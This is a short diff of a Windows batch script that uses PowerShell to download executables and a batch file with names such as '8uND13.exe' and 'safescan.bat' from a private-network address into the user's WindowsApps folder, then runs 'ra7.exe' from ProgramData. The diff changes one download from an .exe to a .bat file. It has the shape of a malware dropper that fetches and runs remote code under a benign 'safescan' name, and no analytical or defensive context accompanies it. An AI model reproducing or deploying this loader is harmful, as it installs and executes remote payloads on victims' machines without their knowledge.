@@ -19,6 +19,6 @@ IF NOT EXIST '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\safescan.bat' (
    powershell -Command "Invoke-WebRequest http://192.168.56.101/8uND13.exe -OutFile '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\8uND13.exe'"
 
 :REDOWN3
-   powershell -Command "Invoke-WebRequest http://192.168.56.101/safescan.exe -OutFile '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\safescan.exe'"
+   powershell -Command "Invoke-WebRequest http://192.168.56.101/safescan.bat -OutFile '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\safescan.bat'"
 
 powershell -Command "& C:\ProgramData\ra7.exe"
